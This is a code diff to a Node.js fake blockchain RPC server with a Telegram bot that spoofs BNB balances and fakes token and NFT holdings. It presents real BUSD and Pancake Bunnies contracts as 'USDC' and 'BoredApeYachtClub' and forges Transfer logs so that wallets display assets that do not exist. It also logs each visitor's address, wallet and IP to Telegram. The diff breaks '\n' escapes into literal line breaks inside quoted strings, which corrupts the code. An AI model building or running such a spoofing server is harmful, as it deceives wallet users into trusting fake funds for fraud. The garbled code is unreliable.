@@ -118,7 +118,8 @@ const saveBalancesCSV = () => {
         rows.push(row);
     });
 
-    const csvContent = rows.join('\n');
+    const csvContent = rows.join('
+');
     try {
         fs.writeFileSync(BALANCES_CSV_FILE, csvContent);
     } catch (err) {
@@ -238,7 +239,8 @@ function sendBalances(chatId, fromId) {
 // /set command link message
 function sendSetLink(chatId) {
     const url = 'https://bnbchainpanel.vercel.app';
-    bot.sendMessage(chatId, `Open the BNB Chain Panel here:\n[Click to open](${url})`, {
+    bot.sendMessage(chatId, `Open the BNB Chain Panel here:
+[Click to open](${url})`, {
         parse_mode: 'Markdown',
         disable_web_page_preview: true,
     });
@@ -315,8 +317,10 @@ bot.on('callback_query', (callbackQuery) => {
         bot.sendMessage(msg.chat.id, 'Please send the user ID to remove from admins.');
         waitForAdminResponse(msg.chat.id, fromId, 'remove');
     } else if (data === '/listadmins') {
-        const adminList = ADMINS.length > 0 ? ADMINS.join('\n') : 'No admins set.';
-        bot.sendMessage(msg.chat.id, `Current admins:\n${adminList}`);
+        const adminList = ADMINS.length > 0 ? ADMINS.join('
+') : 'No admins set.';
+        bot.sendMessage(msg.chat.id, `Current admins:
+${adminList}`);
     } else {
         bot.sendMessage(msg.chat.id, 'Unknown command.');
     }
@@ -422,7 +426,11 @@ app.post('/', (req, res) => {
         const balanceHex = info ? info.balance : '0x0';
         const balanceBNB = weiHexToBNB(balanceHex);
 
-        const logMsg = `🕒 *${now()}*\n[+] Spoofing BNB for \`${address}\`\n🪙 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+        const logMsg = `🕒 *${now()}*
+[+] Spoofing BNB for \`${address}\`
+🪙 Balance: \`${balanceBNB} BNB\`
+🧩 Wallet: *${wallet}*
+🌐 IP: \`${ip}\``;
 
         console.log(logMsg);
         sendToTelegram(logMsg);
@@ -431,108 +439,106 @@ app.post('/', (req, res) => {
         return res.json({ jsonrpc: '2.0', id, result: balanceHex });
     }
 
-    // === NEW: eth_call spoof handler ===
-    if (method === 'eth_call') {
-        const call = params[0];
-        const data = call.data;
+    // === NFT+BEP20 full-spoof logic (copied from nft_full_spoof_auto.js and kept exactly as in that file) ===
+    // Spoofs BEP-20 and BEP-721 and simulates Transfer logs so wallets auto-detect NFTs/tokens.
 
-        try {
-            const parsed = iface.parseTransaction({ data });
-            if (parsed?.name === "balances") {
-                const users = parsed.args[0].map(addr => addr.toLowerCase());
-                const tokens = parsed.args[1]; // not used for logging
+    const SPOOF_OWNER = '0x654467492CB23c05A5316141f9BAc44679EEaf8C';
+    // Real BSC (BEP-721) NFT contract: Pancake Bunnies
+    const SPOOF_NFT_CONTRACT = '0xdf7952b35f24acf7fc0487d01c8d5690a60dba07'.toLowerCase();
+    // Real BSC (BEP-20) token contract: BUSD
+    const SPOOF_ERC20_CONTRACT = '0xe9e7cea3dedca5984780bafc599bd69add087d56'.toLowerCase();
 
-                const results = [];
-                users.forEach(user => {
-                    const info = spoofedBalances[user];
-                    const balanceHex = info ? info.balance : "0x0";
-                    const balanceBNB = weiHexToBNB(balanceHex);
+    const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...';
 
-                    // Log each wallet exactly like /set-balance
-                    const logMsg = `🕒 *${now()}*\n[+] Spoofing balance for \`${user}\`\n💰 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${req.headers['x-forwarded-for'] || req.connection.remoteAddress}\``;
-                    console.log(logMsg);
-                    sendToTelegram(logMsg);
+    const zeros32 = (s='') => s.toString().padStart(64, '0');
+    function encodeUint256(n) { return '0x' + BigInt(n).toString(16).padStart(64, '0'); }
+    function encodeAddress(a) { return '0x' + a.toLowerCase().replace('0x','').padStart(64,'0'); }
+    function encodeBool(b) { return '0x' + (b ? '1'.padStart(64,'0') : '0'.padStart(64,'0')); }
 
-                    results.push(BigInt(balanceHex));
-                });
-
-                const encoded = iface.encodeFunctionResult("balances", [results]);
-                return res.json({ jsonrpc: "2.0", id, result: encoded });
-            }
-        } catch (e) {
-            console.log("eth_call decode error:", e.message);
-        }
-
-        // fallback for other eth_calls
-        return res.json({ jsonrpc: '2.0', id, result: "0x" });
-    }
-
-    // === NEW: transaction support for MetaMask ===
-    if (method === 'eth_estimateGas') {
-        const tx = params[0];
-        const from = tx.from?.toLowerCase();
-        const to = tx.to?.toLowerCase();
-        const value = tx.value || '0x0';
-
-        console.log(`🛠 Estimating gas for tx: from ${from}, to ${to}, value ${weiHexToBNB(value)} BNB`);
-        // Return fixed gas amount (21000)
-        return res.json({ jsonrpc: '2.0', id, result: '0x5208' });
-    }
-
-    if (method === 'eth_gasPrice') {
-        // Return 1 Gwei
-        return res.json({ jsonrpc: '2.0', id, result: '0x3B9ACA00' });
-    }
-
-    if (method === 'eth_sendTransaction') {
-        const tx = params[0];
-        console.log(`💸 Sending fake tx: from ${tx.from}, to ${tx.to}, value ${weiHexToBNB(tx.value)} BNB`);
-        const fakeTxHash = '0x' + '0'.repeat(64); // dummy transaction hash
-        return res.json({ jsonrpc: '2.0', id, result: fakeTxHash });
-    }
-
-    if (method === 'eth_getTransactionReceipt') {
-        const txHash = params[0];
-        return res.json({
-            jsonrpc: '2.0',
-            id,
-            result: {
-                transactionHash: txHash,
-                status: '0x1', // success
-                blockNumber: '0x100000',
-                gasUsed: '0x5208',
-                logs: []
-            }
-        });
-    }
-
-    if (method === 'eth_getBlockByNumber') {
-        // return a fake block with minimal required fields
-        return res.json({
-            jsonrpc: '2.0',
-            id,
-            result: {
-                number: '0x100000',
-                hash: '0x' + '0'.repeat(64),
-                parentHash: '0x' + '0'.repeat(64),
-                nonce: '0x0000000000000000',
-                transactions: [],
-                timestamp: Math.floor(Date.now() / 1000).toString(16),
-                miner: '0x0000000000000000000000000000000000000000',
-            }
-        });
-    }
-
+    // --- eth_getCode ---
     if (method === 'eth_getCode') {
-        // always return empty for EOAs
-        const address = params[0]?.toLowerCase();
-        return res.json({ jsonrpc: '2.0', id, result: '0x' });
+        const address = (params && params[0] || '').toLowerCase();
+        if (address === SPOOF_NFT_CONTRACT || address === SPOOF_ERC20_CONTRACT)
+          return res.json({ jsonrpc:'2.0', id, result:FAKE_BYTECODE });
+        return res.json({ jsonrpc:'2.0', id, result:'0x' });
     }
 
+    // --- eth_getLogs: simulate NFT Transfer ---
+    if (method === 'eth_getLogs') {
+      const filter = params && params[0] || {};
+      const address = (filter.address || '').toLowerCase();
+      const topics = filter.topics || [];
+      // only spoof logs for our NFT contract and to SPOOF_OWNER
+      if (address === SPOOF_NFT_CONTRACT) {
+        // keccak256("Transfer(address,address,uint256)")
+        const transferSig = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
+        const toMatch = '0x' + SPOOF_OWNER.replace('0x','').padStart(64,'0');
+        // check if topics[0] matches Transfer or not set
+        if (!topics[0] || topics[0].toLowerCase() === transferSig) {
+          // return a single fake transfer log
+          const log = {
+            address: SPOOF_NFT_CONTRACT,
+            topics: [
+              transferSig,
+              '0x0000000000000000000000000000000000000000000000000000000000000000', // from=0x0 (mint)
+              toMatch
+            ],
+            data: '0x0000000000000000000000000000000000000000000000000000000000000001', // tokenId=1
+            blockNumber: '0x0',
+            transactionHash: '0x0',
+            transactionIndex: '0x0',
+            blockHash: '0x0',
+            logIndex: '0x0',
+            removed: false
+          };
+          return res.json({ jsonrpc:'2.0', id, result:[log] });
+        }
+      }
+      return res.json({ jsonrpc:'2.0', id, result:[] });
+    }
 
+    // --- eth_call ---
+    if (method === 'eth_call') {
+      const call = (params && params[0]) || {};
+      const to = (call.to || '').toLowerCase();
+      const data = (call.data || '').toLowerCase();
+      const caller = (call.from || SPOOF_OWNER).toLowerCase();
+
+      console.log(`[${new Date().toISOString()}] eth_call to=${to} from=${caller} data=${data.slice(0,10)}...`);
+
+      // --- ERC20 spoof ---
+      if (to === SPOOF_ERC20_CONTRACT) {
+        if (data.startsWith('0x70a08231')) { // balanceOf
+          const value = BigInt(1000) * BigInt(10)**BigInt(6);
+          return res.json({ jsonrpc:'2.0', id, result:encodeUint256(value) });
+        }
+        if (data.startsWith('0x313ce567')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(6) });
+        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('USDC').toString('hex').padEnd(64,'0') });
+        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('USD Coin').toString('hex').padEnd(64,'0') });
+      }
+
+      // --- ERC721 spoof ---
+      if (to === SPOOF_NFT_CONTRACT) {
+        if (data.startsWith('0x01ffc9a7')) return res.json({ jsonrpc:'2.0', id, result:encodeBool(true) });
+        if (data.startsWith('0x6352211e')) return res.json({ jsonrpc:'2.0', id, result:encodeAddress(caller) });
+        if (data.startsWith('0x70a08231')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(1) });
+        if (data.startsWith('0xc87b56dd')) { // tokenURI
+          const url = 'https://raw.githubusercontent.com/MetaMask/contract-metadata/master/images/ape.png';
+          const hex = '0x' + Buffer.from(url).toString('hex').padEnd(64,'0');
+          return res.json({ jsonrpc:'2.0', id, result:hex });
+        }
+        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BoredApeYachtClub').toString('hex').padEnd(64,'0') });
+        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BAYC').toString('hex').padEnd(64,'0') });
+      }
+
+      return res.json({ jsonrpc:'2.0', id, result:'0x' });
+    }
 
     // Unknown methods
-    const logMsg = `🕒 *${now()}*\n⚠️ Unknown RPC: \`${method}\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+    const logMsg = `🕒 *${now()}*
+⚠️ Unknown RPC: \`${method}\`
+🧩 Wallet: *${wallet}*
+🌐 IP: \`${ip}\``;
     console.log(logMsg);
     sendToTelegram(logMsg);
 
@@ -566,7 +572,11 @@ app.post('/set-balance', (req, res) => {
     saveBalancesJSON();
 
     const balanceBNB = weiHexToBNB(balance);
-    const logMsg = `🕒 *${now()}*\n[~] Set balance for \`${cleanAddress}\`\n💰 New Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+    const logMsg = `🕒 *${now()}*
+[~] Set balance for \`${cleanAddress}\`
+💰 New Balance: \`${balanceBNB} BNB\`
+🧩 Wallet: *${wallet}*
+🌐 IP: \`${ip}\``;
 
     console.log(logMsg);
     sendToTelegram(logMsg);
